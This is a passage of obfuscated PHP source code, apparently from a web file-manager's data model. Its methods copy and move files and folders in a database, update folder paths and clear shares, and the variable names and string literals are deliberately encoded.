$this->sourceInfo($üº™Î«); $ÓÂ³üœÆ = $this->sourceInfo($Òğ¹ÚÏ); if (!$ÄÜÅÕ±Š || !$ÓÂ³üœÆ || $ÓÂ³üœÆ[$ÃÕè½ªñ[487]] != $ÃÕè½ªñ[91]) { return !1; } if ($this->isParentOf($üº™Î«, $Òğ¹ÚÏ)) { return !1; } $’¶ÛßÄä = $êìœ¤ú¼ ? $êìœ¤ú¼ : $ÄÜÅÕ±Š[$ÃÕè½ªñ[32]]; $this->lockCopyStart($üº™Î«); $this->lockWriteStart($Òğ¹ÚÏ, $’¶ÛßÄä); $ïšê§šÒ = array($ÃÕè½ªñ[636] => array(), $ÃÕè½ªñ[637] => array(), $ÃÕè½ªñ[638] => array()); $this->targetIsDelete = intval($ÄÜÅÕ±Š[$ÃÕè½ªñ[507]]); $¯‚¸¦ = $this->fileNameExistAuto($Òğ¹ÚÏ, $ÄÜÅÕ±Š); $„¾¢ÚÌõ = $this->_copy($üº™Î«, $Òğ¹ÚÏ, $¾ñÑì¶Ì, $ïšê§šÒ, !0, $êìœ¤ú¼); $this->_childrenListClear(); $this->lockCopyEnd($üº™Î«); $this->lockWriteEnd($Òğ¹ÚÏ, $’¶ÛßÄä); if ($ÄÜÅÕ±Š[$ÃÕè½ªñ[487]] == $ÃÕè½ªñ[91] && $¯‚¸¦ == $„¾¢ÚÌõ) { $this->folderSizeResetChildren($¯‚¸¦); } Model($ÃÕè½ªñ[639])->addAll($ïšê§šÒ[$ÃÕè½ªñ[637]], array(), !0); if ($¯‚¸¦ != $„¾¢ÚÌõ || $ÄÜÅÕ±Š[$ÃÕè½ªñ[487]] == $ÃÕè½ªñ[91]) { Model($ÃÕè½ªñ[640])->eventCopy($„¾¢ÚÌõ); } $this->saveAll($ïšê§šÒ[$ÃÕè½ªñ[638]]); Model($ÃÕè½ªñ[233])->linkAdd($ïšê§šÒ[$ÃÕè½ªñ[636]]); $this->folderSizeReset($Òğ¹ÚÏ); $this->updateModifyTime($Òğ¹ÚÏ); return $„¾¢ÚÌõ; } private function _copy($¤¤‡°Û…, $ó‘œ×ó, $æ”ıØû©, &$µÎùñ€Î, $êˆ¶•Õø, $œÄ ¬…Û = '') { $ŸŸÙ²çÚ =& $_SERVER[ıÚ˜š²İ]; $õ ·±Õá = $this->sourceInfoCache($¤¤‡°Û…); $™‘Ö«®¢ = $õ ·±Õá[$ŸŸÙ²çÚ[487]] == $ŸŸÙ²çÚ[91]; $Ã‚‚Ôç† = $œÄ ¬…Û ? $œÄ ¬…Û : $õ ·±Õá[$ŸŸÙ²çÚ[32]]; $Ã×¥º«¦ = $this->fileNameExistAuto($ó‘œ×ó, $õ ·±Õá); if ($êˆ¶•Õø) { $this->_childrenAllMake($¤¤‡°Û…); if ($™‘Ö«®¢ && $Ã×¥º«¦) { $this->_childrenAllMake($Ã×¥º«¦); } } if (!$Ã×¥º«¦) { return $this->_copyCreate($¤¤‡°Û…, $ó‘œ×ó, $Ã‚‚Ôç†, $µÎùñ€Î); } $ìˆØ­ = $Ã×¥º«¦; if ($™‘Ö«®¢) { if ($æ”ıØû© == REPEAT_RENAME_FOLDER) { $Ã‚‚Ôç† = $this->fileNameAutoCache($ó‘œ×ó, $Ã‚‚Ôç†, $æ”ıØû©, $™‘Ö«®¢); $ìˆØ­ = $this->_copyCreate($¤¤‡°Û…, $ó‘œ×ó, $Ã‚‚Ôç†, $µÎùñ€Î); } else { $•äÂ´üÂ = $this->_childrenList($¤¤‡°Û…); foreach ($•äÂ´üÂ as $á¨œœ®Ğ) { $this->_copy($á¨œœ®Ğ[$ŸŸÙ²çÚ[194]], $Ã×¥º«¦, $æ”ıØû©, $µÎùñ€Î, !1); } } } else { if ($æ”ıØû© == REPEAT_RENAME || $æ”ıØû© == REPEAT_RENAME_FOLDER) { $Ã‚‚Ôç† = $this->fileNameAutoCache($ó‘œ×ó, $Ã‚‚Ôç†, $æ”ıØû©, $™‘Ö«®¢); $ìˆØ­ = $this->_copyCreate($¤¤‡°Û…, $ó‘œ×ó, $Ã‚‚Ôç†, $µÎùñ€Î); } else { if ($æ”ıØû© == REPEAT_REPLACE) { $·Ñ©ôŸú = $this->sourceInfoCache($Ã×¥º«¦); $©¾¨Ãä– = $this->fileHistory($·Ñ©ôŸú, $õ ·±Õá[$ŸŸÙ²çÚ[545]], $õ ·±Õá[$ŸŸÙ²çÚ[79]]); if ($©¾¨Ãä–) { $µÎùñ€Î[$ŸŸÙ²çÚ[636]][] = $õ ·±Õá[$ŸŸÙ²çÚ[545]]; } } else { if ($æ”ıØû© == REPEAT_SKIP) { } } } Hook::trigger($ŸŸÙ²çÚ[641], array($ŸŸÙ²çÚ[642], $õ ·±Õá, 0)); } return $ìˆØ­; } private function _copyCreate($¾ÇÊÒ¹, $íàÄÇöû, $ÀòÕöá®, &$ÆçŒü) { $¦™ÃÊ¨“ =& $_SERVER[ıÚ˜š²İ]; $·èÂ¾Øü = $this->sourceInfoCache($¾ÇÊÒ¹); $ÛÑÎœâ = $this->sourceInfoCache($íàÄÇöû); $Š¶å€Ñê = $this->_makeItemData($·èÂ¾Øü, $ÛÑÎœâ, $ÀòÕöá®); Hook::trigger($¦™ÃÊ¨“[643], $Š¶å€Ñê); Hook::trigger($¦™ÃÊ¨“[644], array($¦™ÃÊ¨“[645], $Š¶å€Ñê, 0)); $¬«ôĞ¹ó = $this->add($Š¶å€Ñê); $ÍóÓã®Ø = array($¦™ÃÊ¨“[194] => $¬«ôĞ¹ó, $¦™ÃÊ¨“[32] => $ÀòÕöá®); $this->_copyApplyMeta($ÍóÓã®Ø, $ÆçŒü); if ($·èÂ¾Øü[$¦™ÃÊ¨“[487]] != $¦™ÃÊ¨“[91]) { $ÆçŒü[$¦™ÃÊ¨“[636]][] = $·èÂ¾Øü[$¦™ÃÊ¨“[545]]; return $¬«ôĞ¹ó; } $„Åç±Ò¦ = array(); $ûËçŞµ¼ = array(); $this->_childrenListAll($¾ÇÊÒ¹, $„Åç±Ò¦); $áÀçÇ—Î = count($„Åç±Ò¦); if ($áÀçÇ—Î == 0) { return $¬«ôĞ¹ó; } $ØÜß = $this->sourceInfo($¬«ôĞ¹ó); foreach ($„Åç±Ò¦ as $ã¯Ñğå) { $ı©¹ô†Ó = $this->_makeItemData($ã¯Ñğå, $ØÜß, $ã¯Ñğå[$¦™ÃÊ¨“[32]]); $ı©¹ô†Ó[$¦™ÃÊ¨“[588]] = $ã¯Ñğå[$¦™ÃÊ¨“[588]]; $ûËçŞµ¼[] = $ı©¹ô†Ó; } $this->chunkEventSet($¦™ÃÊ¨“[646], array($¦™ÃÊ¨“[647], $Š¶å€Ñê, $áÀçÇ—Î)); $this->addAll($ûËçŞµ¼, array(), !1); $Ôå¢¬Ó¥ = $this->where(array($¦™ÃÊ¨“[193] => $¬«ôĞ¹ó))->select(); $ƒÈ¨ùéÒ = $this->_childrenMakeRelation($„Åç±Ò¦, $Ôå¢¬Ó¥); $ƒÈ¨ùéÒ[$¾ÇÊÒ¹] = $¬«ôĞ¹ó; $í¥®×í = array(); $İÒ£‚üû = array(); foreach ($Ôå¢¬Ó¥ as $ã¯Ñğå) { $ùßÆ‡›“ = $ã¯Ñğå[$¦™ÃÊ¨“[194]]; $ĞœŸ÷§ = $this->_childrenMatch($ƒÈ¨ùéÒ, $ã¯Ñğå, $ØÜß); $í¥®×í[] = array($¦™ÃÊ¨“[194], $ùßÆ‡›“, $¦™ÃÊ¨“[193], $ĞœŸ÷§[$¦™ÃÊ¨“[193]]); $İÒ£‚üû[] = array($¦™ÃÊ¨“[194], $ùßÆ‡›“, $¦™ÃÊ¨“[588], $ĞœŸ÷§[$¦™ÃÊ¨“[588]]); $this->_copyApplyMeta($ã¯Ñğå, $ÆçŒü); if ($ã¯Ñğå[$¦™ÃÊ¨“[487]] != $¦™ÃÊ¨“[91]) { $ÆçŒü[$¦™ÃÊ¨“[636]][] = $ã¯Ñğå[$¦™ÃÊ¨“[545]]; } } $this->chunkEventSet($¦™ÃÊ¨“[648], array($¦™ÃÊ¨“[649], $Š¶å€Ñê, $áÀçÇ—Î)); $this->saveAll($í¥®×í); $this->chunkEventSet($¦™ÃÊ¨“[650], array($¦™ÃÊ¨“[651], $Š¶å€Ñê, $áÀçÇ—Î)); $this->saveAll($İÒ£‚üû); return $¬«ôĞ¹ó; } private function _childrenMakeRelation($Õ®­Ğ¯À, $èï²€Ÿå) { $‘µ¼ÙóŸ =& $_SERVER[ıÚ˜š²İ]; $Şùœõ = array(); $ğ²ïÎå¬ = array(); foreach ($Õ®­Ğ¯À as $§›öéï¢) { $Ø Úğ¨ = $§›öéï¢[$‘µ¼ÙóŸ[32]] . $‘µ¼ÙóŸ[8] . $§›öéï¢[$‘µ¼ÙóŸ[588]]; $Şùœõ[$Ø Úğ¨] = $§›öéï¢[$‘µ¼ÙóŸ[194]]; } foreach ($èï²€Ÿå as $§›öéï¢) { $Ø Úğ¨ = $§›öéï¢[$‘µ¼ÙóŸ[32]] . $‘µ¼ÙóŸ[8] . $§›öéï¢[$‘µ¼ÙóŸ[588]]; $Ë´°ÖÏÕ = $Şùœõ[$Ø Úğ¨]; $ğ²ïÎå¬[$Ë´°ÖÏÕ] = $§›öéï¢[$‘µ¼ÙóŸ[194]]; } return $ğ²ïÎå¬; } private function _childrenMatch($Î§÷¼¬°, $øŞ˜ûÆ, $¦ÏóÇòò) { $§ıèóúÄ =& $_SERVER[ıÚ˜š²İ]; $âàíÛï = $¦ÏóÇòò[$§ıèóúÄ[588]]; $†ƒÁ‘› = $this->parentLevelArray($øŞ˜ûÆ[$§ıèóúÄ[588]]); foreach ($†ƒÁ‘› as $¿³Ùá¦ã) { if (isset($Î§÷¼¬°[$¿³Ùá¦ã])) { $âàíÛï .= $Î§÷¼¬°[$¿³Ùá¦ã] . $§ıèóúÄ[652]; } } $âàíÛï = rtrim($âàíÛï, $§ıèóúÄ[50]) . $§ıèóúÄ[50]; $ö¥œ²ßø = $this->parentLevelArray($âàíÛï); $¼Ğ§«íƒ = $ö¥œ²ßø[count($ö¥œ²ßø) - 1]; return array($§ıèóúÄ[193] => $¼Ğ§«íƒ, $§ıèóúÄ[588] => $âàíÛï); } private function _makeItemData($¹£ûº‚è, $ÓäÁñ›, $öÉ±Ç¼Ì) { $á÷áµÖÉ =& $_SERVER[ıÚ˜š²İ]; $¬íøåñ = array($á÷áµÖÉ[653] => $¹£ûº‚è[$á÷áµÖÉ[487]], $á÷áµÖÉ[496] => $öÉ±Ç¼Ì, $á÷áµÖÉ[654] => $¹£ûº‚è[$á÷áµÖÉ[488]] ? $¹£ûº‚è[$á÷áµÖÉ[488]] : $á÷áµÖÉ[12], $á÷áµÖÉ[546] => $¹£ûº‚è[$á÷áµÖÉ[545]] ? $¹£ûº‚è[$á÷áµÖÉ[545]] : 0, $á÷áµÖÉ[624] => $¹£ûº‚è[$á÷áµÖÉ[79]] ? $¹£ûº‚è[$á÷áµÖÉ[79]] : 0, $á÷áµÖÉ[655] => intval($ÓäÁñ›[$á÷áµÖÉ[191]]), $á÷áµÖÉ[656] => intval($ÓäÁñ›[$á÷áµÖÉ[573]]), $á÷áµÖÉ[657] => intval(USER_ID), $á÷áµÖÉ[658] => intval(USER_ID), $á÷áµÖÉ[479] => intval($ÓäÁñ›[$á÷áµÖÉ[194]]), $á÷áµÖÉ[659] => $ÓäÁñ›[$á÷áµÖÉ[588]] . $ÓäÁñ›[$á÷áµÖÉ[194]] . $á÷áµÖÉ[50], $á÷áµÖÉ[500] => $¹£ûº‚è[$á÷áµÖÉ[88]] ? $¹£ûº‚è[$á÷áµÖÉ[88]] : time(), $á÷áµÖÉ[506] => 0, $á÷áµÖÉ[660] => $á÷áµÖÉ[12]); return $¬íøåñ; } private function _copyApplyMeta($…¹Æ« †, &$óƒùØÖŞ) { $‹Ü“†™Ô =& $_SERVER[ıÚ˜š²İ]; $ÏİßÖŒ‰ = $…¹Æ« †[$‹Ü“†™Ô[194]]; $êÙÜı¼ = $…¹Æ« †[$‹Ü“†™Ô[32]]; if (!isset($…¹Æ« †[$‹Ü“†™Ô[661]]) || !$…¹Æ« †[$‹Ü“†™Ô[661]] || $…¹Æ« †[$‹Ü“†™Ô[661]] == $‹Ü“†™Ô[231]) { $óƒùØÖŞ[$‹Ü“†™Ô[638]][] = array($‹Ü“†™Ô[194], $ÏİßÖŒ‰, $‹Ü“†™Ô[661], short_id($ÏİßÖŒ‰)); } if (Input::check($êÙÜı¼, $‹Ü“†™Ô[662])) { $óƒùØÖŞ[$‹Ü“†™Ô[637]][] = array($‹Ü“†™Ô[194] => $ÏİßÖŒ‰, $‹Ü“†™Ô[97] => $‹Ü“†™Ô[540], $‹Ü“†™Ô[452] => str_replace($‹Ü“†™Ô[53], $‹Ü“†™Ô[12], Pinyin::get($êÙÜı¼))); $óƒùØÖŞ[$‹Ü“†™Ô[637]][] = array($‹Ü“†™Ô[194] => $ÏİßÖŒ‰, $‹Ü“†™Ô[97] => $‹Ü“†™Ô[539], $‹Ü“†™Ô[452] => Pinyin::get($êÙÜı¼, $‹Ü“†™Ô[663])); } $óƒùØÖŞ[$‹Ü“†™Ô[637]][] = array($‹Ü“†™Ô[194] => $ÏİßÖŒ‰, $‹Ü“†™Ô[97] => $‹Ü“†™Ô[519], $‹Ü“†™Ô[452] => KodSort::makeStr($êÙÜı¼)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($õ©µñ‚İ) { $¯÷´¤ş =& $_SERVER[ıÚ˜š²İ]; $¬„‰®ğ¬ = $this->sourceInfo($õ©µñ‚İ); $½±‡–ÑŒ = $¯÷´¤ş[664]; $ÜÅ¸šùª = array($¯÷´¤ş[588] => array($¯÷´¤ş[619], $¬„‰®ğ¬[$¯÷´¤ş[588]] . $õ©µñ‚İ . $¯÷´¤ş[620]), $¯÷´¤ş[507] => $this->targetIsDelete); $íÍ‡Ë = $this->field($½±‡–ÑŒ)->where($ÜÅ¸šùª)->select(); if (!$íÍ‡Ë) { return; } $íÍ‡Ë = array_to_keyvalue($íÍ‡Ë, $¯÷´¤ş[194]); foreach ($íÍ‡Ë as $”§º„Ëâ) { $˜äÇô = $”§º„Ëâ[$¯÷´¤ş[193]]; $õ©µñ‚İ = $”§º„Ëâ[$¯÷´¤ş[194]]; if (!isset($this->_childrenListCache[$õ©µñ‚İ]) && $”§º„Ëâ[$¯÷´¤ş[487]] == $¯÷´¤ş[91]) { $this->_childrenListCache[$õ©µñ‚İ] = array(); } if (!isset($this->_childrenListCache[$˜äÇô])) { $this->_childrenListCache[$˜äÇô] = array(); } $this->_childrenListCache[$˜äÇô][$õ©µñ‚İ] = $”§º„Ëâ; $this->_childrenItemCache[$õ©µñ‚İ] = $”§º„Ëâ; } } private function _childrenListAll($Ş“«ø¹¦, &$Î¢Ú´ì¡) { $¥ÄÙ“ú“ =& $_SERVER[ıÚ˜š²İ]; if (!isset($this->_childrenListCache[$Ş“«ø¹¦])) { return; } $èšÉÛ¹² = $this->_childrenListCache[$Ş“«ø¹¦]; foreach ($èšÉÛ¹² as $±ê°¶¦æ => $á©š¢¢ß) { $Î¢Ú´ì¡[$±ê°¶¦æ] = $á©š¢¢ß; if ($á©š¢¢ß[$¥ÄÙ“ú“[487]] == $¥ÄÙ“ú“[91]) { $this->_childrenListAll($±ê°¶¦æ, $Î¢Ú´ì¡); } } } private function sourceInfoCache($Æ¤·Õ) { if (isset($this->_childrenItemCache[$Æ¤·Õ])) { return $this->_childrenItemCache[$Æ¤·Õ]; } return $this->sourceInfo($Æ¤·Õ); } private function _childrenList($´š÷¡ÃÜ) { if (isset($this->_childrenListCache[$´š÷¡ÃÜ])) { return $this->_childrenListCache[$´š÷¡ÃÜ]; } return $this->_childrenListSelect($´š÷¡ÃÜ); } private function _childrenListSelect($’‡Šİıè) { $çûÂ˜œÂ =& $_SERVER[ıÚ˜š²İ]; $ÁüÛğ = array($çûÂ˜œÂ[193] => $’‡Šİıè, $çûÂ˜œÂ[507] => $this->targetIsDelete); $œª¤×ÈÃ = $this->where($ÁüÛğ)->select(); $œª¤×ÈÃ = $œª¤×ÈÃ ? $œª¤×ÈÃ : array(); $–ŠˆšùÑ = array_to_keyvalue($œª¤×ÈÃ, $çûÂ˜œÂ[194]); $this->_childrenListCache[$’‡Šİıè] = $–ŠˆšùÑ; foreach ($–ŠˆšùÑ as $’‡Šİıè => $óĞ¢ÄŠƒ) { $this->_childrenItemCache[$’‡Šİıè] = $óĞ¢ÄŠƒ; } return $–ŠˆšùÑ; } private function fileNameExistAuto($ÁõÕ—€™, $ıûĞ¡­) { $·ã®øˆ« =& $_SERVER[ıÚ˜š²İ]; if ($ıûĞ¡­[$·ã®øˆ«[507]] == $·ã®øˆ«[91]) { return $this->fileNameExist($ÁõÕ—€™, $ıûĞ¡­[$·ã®øˆ«[32]]); } return $this->fileNameExistCache($ÁõÕ—€™, $ıûĞ¡­[$·ã®øˆ«[32]]); } private function fileNameExistCache($¬Ÿ€ªê†, $âÊàü³) { $İü¤Ã¦â =& $_SERVER[ıÚ˜š²İ]; $âÊàü³ = strtolower($âÊàü³); $Ó¬ƒÉ†ô = $this->_childrenList($¬Ÿ€ªê†); foreach ($Ó¬ƒÉ†ô as $¶ª¼»æ˜) { if ($âÊàü³ == strtolower($¶ª¼»æ˜[$İü¤Ã¦â[32]])) { return $¶ª¼»æ˜[$İü¤Ã¦â[194]]; } } return !1; } private function fileNameAutoCache($ ¹æØ˜Ï, $ë¢ôÇÀü, $ÇˆæËå£, $÷ÍÒŸâÅ) { $Œİ³›³ =& $_SERVER[ıÚ˜š²İ]; $£ŞŞüúâ = $this->_childrenList($ ¹æØ˜Ï); $©Ší¨„» = array_to_keyvalue($£ŞŞüúâ, $Œİ³›³[12], $Œİ³›³[32]); return $this->fileNameAutoGet($©Ší¨„», $ë¢ôÇÀü, $ÇˆæËå£, $÷ÍÒŸâÅ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($±Ò¡äè, $Éã˜¯°Œ, $§¨šÇ³¥ = REPEAT_REPLACE, $£ª¦ÉÙà = '') { $Øå¶“« =& $_SERVER[ıÚ˜š²İ]; $ïˆæšî = $this->sourceInfo($±Ò¡äè); $ó½üÔ˜Ä = $this->sourceInfo($Éã˜¯°Œ); if ($ïˆæšî[$Øå¶“«[193]] == $ó½üÔ˜Ä[$Øå¶“«[194]]) { if ($ïˆæšî[$Øå¶“«[507]] == $Øå¶“«[91]) { Model($Øå¶“«[505])->restore(array($±Ò¡äè)); } if (!$£ª¦ÉÙà || $£ª¦ÉÙà == $ïˆæšî[$Øå¶“«[32]]) { return $±Ò¡äè; } } $ûÙ¦Ó— = $this->pathInfoMore($±Ò¡äè); if ($this->isParentOf($±Ò¡äè, $Éã˜¯°Œ)) { return !1; } if (!$ïˆæšî || !$ó½üÔ˜Ä || $ó½üÔ˜Ä[$Øå¶“«[487]] != $Øå¶“«[91]) { return !1; } Hook::trigger($Øå¶“«[665], $ûÙ¦Ó—); $this->targetIsDelete = intval($ïˆæšî[$Øå¶“«[507]]); if ($ïˆæšî[$Øå¶“«[193]] == $Éã˜¯°Œ && $£ª¦ÉÙà != $ïˆæšî[$Øå¶“«[32]]) { $¯Çáñ× = $this->fileNameExist($Éã˜¯°Œ, $£ª¦ÉÙà); if ($¯Çáñ× && $ïˆæšî[$Øå¶“«[487]] == $Øå¶“«[231]) { $½Äî„ˆ™ = $this->sourceInfo($¯Çáñ×); $ïÁµúÂ = $this->fileHistory($½Äî„ˆ™, $ïˆæšî[$Øå¶“«[545]], $ïˆæšî[$Øå¶“«[79]]); if (!$ïÁµúÂ) { Model($Øå¶“«[548])->remove($ïˆæšî[$Øå¶“«[545]]); } $this->removeNow($±Ò¡äè, !1); $this->folderSizeReset($Éã˜¯°Œ); Hook::trigger($Øå¶“«[666], $ûÙ¦Ó—); return $¯Çáñ×; } } $ËÊŸÈ²ó = $£ª¦ÉÙà ? $£ª¦ÉÙà : $ïˆæšî[$Øå¶“«[32]]; $this->lockMoveStart($±Ò¡äè); $this->lockWriteStart($Éã˜¯°Œ, $ËÊŸÈ²ó); $ùñö˜ç¯ = array($Øå¶“«[636] => array(), $Øå¶“«[667] => !1); $this->clearShare($±Ò¡äè, $Éã˜¯°Œ); $ğ•’ª¿ = $this->fileNameExistAuto($Éã˜¯°Œ, $ïˆæšî); $…Îñıœˆ = $this->_move($±Ò¡äè, $Éã˜¯°Œ, $§¨šÇ³¥, $ùñö˜ç¯, $£ª¦ÉÙà); $this->sourceCacheClear(); if ($ïˆæšî[$Øå¶“«[487]] == $Øå¶“«[91] && $ğ•’ª¿) { $this->folderSizeResetChildren($…Îñıœˆ); } Model($Øå¶“«[233])->linkAdd($ùñö˜ç¯[$Øå¶“«[636]]); if ($…Îñıœˆ && $ğ•’ª¿ && $ùñö˜ç¯[$Øå¶“«[667]]) { $•ÎŒ•÷ = $ïˆæšî[$Øå¶“«[487]] == $Øå¶“«[91] ? $this->_childrenListSelect($±Ò¡äè) : !1; $…æÄÅâ  = $•ÎŒ•÷ && count($•ÎŒ•÷) > 0 ? !0 : !1; $this->removeNow($±Ò¡äè, $…æÄÅâ ); } $this->lockMoveEnd($±Ò¡äè); $this->lockWriteEnd($Éã˜¯°Œ, $ËÊŸÈ²ó); $this->folderSizeReset($ïˆæšî[$Øå¶“«[193]]); $this->folderSizeReset($Éã˜¯°Œ); $éÒé”™à = array($ïˆæšî[$Øå¶“«[193]], $Éã˜¯°Œ); if ($ïˆæšî[$Øå¶“«[487]] == $Øå¶“«[91]) { $éÒé”™à[] = $±Ò¡äè; } $this->updateModifyTime($éÒé”™à); Model($Øå¶“«[640])->eventMove($±Ò¡äè, $ïˆæšî[$Øå¶“«[193]], $Éã˜¯°Œ); Hook::trigger($Øå¶“«[666], $ûÙ¦Ó—); return $…Îñıœˆ; } private function _move($à®„ ƒ¡, $Å³ÚÈÊç, $‹¦ûö•¥, &$ê©¯İº, $¯íÍö° = '') { $ÑÑàÚÚ =& $_SERVER[ıÚ˜š²İ]; $è‚îıØš = $this->sourceInfo($à®„ ƒ¡); $ÃÀº€êŸ = $è‚îıØš[$ÑÑàÚÚ[487]] == $ÑÑàÚÚ[91]; $ĞúØßÀ‚ = $¯íÍö° ? $¯íÍö° : $è‚îıØš[$ÑÑàÚÚ[32]]; $µñ¸ˆ° = $this->fileNameExistAuto($Å³ÚÈÊç, $è‚îıØš); $this->lockMoveStart($à®„ ƒ¡); $this->lockWriteStart($Å³ÚÈÊç, $ĞúØßÀ‚); if (!$µñ¸ˆ°) { return $this->_moveForce($à®„ ƒ¡, $Å³ÚÈÊç, $ĞúØßÀ‚); } $ˆÄİ¡£ = $µñ¸ˆ°; $ëä –™© = !1; if ($ÃÀº€êŸ) { if ($‹¦ûö•¥ == REPEAT_RENAME_FOLDER) { $ĞúØßÀ‚ = $this->fileNameAuto($Å³ÚÈÊç, $ĞúØßÀ‚, $‹¦ûö•¥, $ÃÀº€êŸ); $ˆÄİ¡£ = $this->_moveForce($à®„ ƒ¡, $Å³ÚÈÊç, $ĞúØßÀ‚); } else { $±ñ«ñ§‘ = $this->_childrenListSelect($à®„ ƒ¡); foreach ($±ñ«ñ§‘ as $¹¥Å½Ô—) { $â¶è‚ùš = REPEAT_REPLACE; $this->_move($¹¥Å½Ô—[$ÑÑàÚÚ[194]], $µñ¸ˆ°, $â¶è‚ùš, $ê©¯İº); } $ëä –™© = !0; } } else { if ($‹¦ûö•¥ == REPEAT_RENAME || $‹¦ûö•¥ == REPEAT_RENAME_FOLDER) { $ĞúØßÀ‚ = $this->fileNameAuto($Å³ÚÈÊç, $ĞúØßÀ‚, $‹¦ûö•¥, $ÃÀº€êŸ); $ˆÄİ¡£ = $this->_moveForce($à®„ ƒ¡, $Å³ÚÈÊç, $ĞúØßÀ‚); } else { $¨·¨ßş… = $this->sourceInfoCache($µñ¸ˆ°); $Åºã†Å = $this->fileHistory($¨·¨ßş…, $è‚îıØš[$ÑÑàÚÚ[545]], $è‚îıØš[$ÑÑàÚÚ[79]]); if ($Åºã†Å) { $ê©¯İº[$ÑÑàÚÚ[636]][] = $è‚îıØš[$ÑÑàÚÚ[545]]; } $ëä –™© = !0; } } if ($ëä –™©) { $ê©¯İº[$ÑÑàÚÚ[667]] = !0; } return $ˆÄİ¡£; } private function _moveForce($µçˆ¦‚Œ, $€Ó„—µ£, $äîËüÕÍ) { $şìû®ß‡ =& $_SERVER[ıÚ˜š²İ]; $’ëåÀŠ = $this->sourceInfo($µçˆ¦‚Œ); $èî¿­¢î = $this->sourceInfo($€Ó„—µ£); $âøÊŒÍ” = $’ëåÀŠ[$şìû®ß‡[487]] == $şìû®ß‡[91]; $†Ìõ‰• = array($şìû®ß‡[479] => $èî¿­¢î[$şìû®ß‡[194]], $şìû®ß‡[659] => $èî¿­¢î[$şìû®ß‡[588]] . $èî¿­¢î[$şìû®ß‡[194]] . $şìû®ß‡[50], $şìû®ß‡[655] => $èî¿­¢î[$şìû®ß‡[191]], $şìû®ß‡[656] => $èî¿­¢î[$şìû®ß‡[573]], $şìû®ß‡[658] => USER_ID, $şìû®ß‡[496] => $äîËüÕÍ); $åÌ»ÌÑ = $’ëåÀŠ[$şìû®ß‡[191]] == SourceModel::TYPE_GROUP && $èî¿­¢î[$şìû®ß‡[191]] == SourceModel::TYPE_GROUP && $’ëåÀŠ[$şìû®ß‡[573]] == $èî¿­¢î[$şìû®ß‡[573]]; if (!$åÌ»ÌÑ && $this->moveClearAuth) { Model($şìû®ß‡[571])->authClear($µçˆ¦‚Œ); } $³¿ÔÆ¾Ã = $’ëåÀŠ[$şìû®ß‡[507]] == $şìû®ß‡[91] && $èî¿­¢î[$şìû®ß‡[507]] != $şìû®ß‡[91]; if ($³¿ÔÆ¾Ã) { $†Ìõ‰•[$şìû®ß‡[506]] = 0; } if ($âøÊŒÍ”) { $òçšÍ¥ì = array($şìû®ß‡[659] => array($şìû®ß‡[619], $’ëåÀŠ[$şìû®ß‡[588]] . $’ëåÀŠ[$şìû®ß‡[194]] . $şìû®ß‡[620])); $¿€Ü©ô = $’ëåÀŠ[$şìû®ß‡[588]] . $’ëåÀŠ[$şìû®ß‡[194]] . $şìû®ß‡[50]; $Ò‹ÇŠ¸ß = $èî¿­¢î[$şìû®ß‡[588]] . $èî¿­¢î[$şìû®ß‡[194]] . $şìû®ß‡[50] . $’ëåÀŠ[$şìû®ß‡[194]] . $şìû®ß‡[50]; $Ïµ‚Ã°ƒ = array($şìû®ß‡[659] => array($şìû®ß‡[668], "\x72\145\x70\154\x61\143\145\50\x70\141\x72\145\156\164\114\x65\166\x65\x6c\54\x27{$¿€Ü©ô}\x27\54\x27{$Ò‹ÇŠ¸ß}\x27\51"), $şìû®ß‡[655] => $èî¿­¢î[$şìû®ß‡[191]], $şìû®ß‡[656] => $èî¿­¢î[$şìû®ß‡[573]]); if ($³¿ÔÆ¾Ã) { $Ïµ‚Ã°ƒ[$şìû®ß‡[506]] = 0; } $this->where($òçšÍ¥ì)->data($Ïµ‚Ã°ƒ)->save(); } $this->where(array($şìû®ß‡[493] => $µçˆ¦‚Œ))->data($†Ìõ‰•)->save(); return $µçˆ¦‚Œ; } private function clearShare($ş²Çå‹ñ, $†ª¸®œŞ) { $£‰°¶‡ =& $_SERVER[ıÚ˜š²İ]; $ıÕĞıÜŸ = $this->sourceInfo($ş²Çå‹ñ); $é»»ì‘Ã = $this->sourceInfo($†ª¸®œŞ); if ($ıÕĞıÜŸ[$£‰°¶‡[573]] == $é»»ì‘Ã[$£‰°¶‡[573]] && $ıÕĞıÜŸ[$£‰°¶‡[191]] == $£‰°¶‡[669]) { return; } $¢õöå×Ö = array($£‰°¶‡[588] => array($£‰°¶‡[619], $ıÕĞıÜŸ[$£‰°¶‡[588]] . $ş²Çå‹ñ . $£‰°¶‡[620])); $Äï¢‚— = $this->field($£‰°¶‡[493])->where($¢õöå×Ö)->getField($£‰°¶‡[194], !0); if (!$Äï¢‚—) { return; } $¢õöå×Ö = array($£‰°¶‡[194] => array($£‰°¶‡[7], $Äï¢‚—), $£‰°¶‡[670] => 1); $Äˆ«î‰¶ = Model($£‰°¶‡[671])->field($£‰°¶‡[672])->where($¢õöå×Ö)->select(); if (!$Äˆ«î‰¶) { return; } $Äˆ«î‰¶ = array_to_keyvalue($Äˆ«î‰¶, $£‰°¶‡[12], $£‰°¶‡[672]); $¢õöå×Ö = array($£‰°¶‡[672] => array($£‰°¶‡[7], $Äˆ«î‰¶)); Model($£‰°¶‡[671])->where($¢õöå×Ö)->save(array($£‰°¶‡[670] => 0)); Model($£‰°¶‡[673])->where($¢õöå×Ö)->delete(); } public function copyFolderFromIO($®çÕáƒ, $óµòá˜‰, $¥£õ­ª·, $®òé´®‹, $ÓÎ¼³ì, $šªû±äª = false) { $æùµ¥Ø˜ =& $_SERVER[ıÚ˜š²İ]; $—Üü¿óô = array($æùµ¥Ø˜[637] => array(), $æùµ¥Ø˜[638] => array(), $æùµ¥Ø˜[636] => array(), $æùµ¥Ø˜[674] => array()); $‘œ‚¾şò = $šªû±äª ? $šªû±äª : $®çÕáƒ->pathThis($óµòá˜‰); $òğèóŞÚ = $this->fileNameExist($¥£õ­ª·, $‘œ‚¾şò); $Ù‘Ÿóïï = $this->mkdir($¥£õ­ª·, $‘œ‚¾şò, $®òé´®‹); if (!$òğèóŞÚ || $®òé´®‹ == REPEAT_RENAME_FOLDER) { $®òé´®‹ = !1; } if ($òğèóŞÚ) { $this->_childrenAllMake($òğèóŞÚ); } Hook::trigger($æùµ¥Ø˜[675]); $ç¿Õ‰ê³ = 